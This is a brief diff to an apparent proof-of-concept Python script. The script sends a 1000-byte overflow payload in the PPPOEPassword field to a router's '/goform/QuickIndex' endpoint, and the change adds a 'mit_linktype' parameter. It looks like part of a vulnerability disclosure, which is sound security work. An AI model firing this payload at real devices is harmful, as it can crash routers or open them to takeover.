@@ -47,7 +47,7 @@ ip = "192.168.84.101"
 url = "http://" + ip + "/goform/QuickIndex"
 payload = b"a"*1000
 
-data = {"PPPOEPassword": payload}
+data = {"mit_linktype":"2","PPPOEPassword": payload}
 response = requests.post(url, data=data)
 print(response.text)
 ```
